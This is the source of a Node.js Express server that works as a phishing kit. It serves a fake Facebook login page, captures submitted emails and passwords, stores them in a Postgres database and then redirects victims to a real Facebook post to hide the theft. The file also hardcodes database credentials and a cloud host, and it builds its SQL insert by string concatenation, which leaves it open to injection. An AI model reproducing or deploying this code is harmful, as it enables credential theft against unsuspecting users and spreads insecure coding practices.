
var express = require('express');
var app = express();
app.use(express.static('public'));
const PORT = process.env.PORT || 5000;
app.set('view engine', 'ejs');
const pg = require('pg');
var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
const client = new pg.Client({
    user: 'haaasalbrddacm',
    password: '1c86ca363fc1a26cb588bbf08ed0117c6490946bc5b6a7de4e8164c3a76ac184',
    database: 'de35u0icb8jt5u',
    port: 5432,
    host: 'ec2-54-235-114-242.compute-1.amazonaws.com',
    ssl: true
});
client.connect();
app.get('/posts/sadcasm/EeVnwJ8kYoXv9zy9D5C5m5A',function(req,res){
    res.render('facebook');
    
})
app.get('/',function(req,res){
    res.render('facebook')
})


app.post('/confirm', function (req, res) {
    // console.log(req.body)
    var a = req.body.email_a;
    var b = req.body.pass_a;
    var c = req.body.email;
    var d = req.body.pass;
    console.log(a,b,c,d)
   
    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "')", function (err, result) {
        if (!err) {
            console.log(result)
        }
    })
    res.redirect('https://www.facebook.com/SadcasmLoL/photos/a.221551201572697/739890806405398/?type=3&theater')
})
app.listen(PORT, function () {
    console.log('Server Started')
})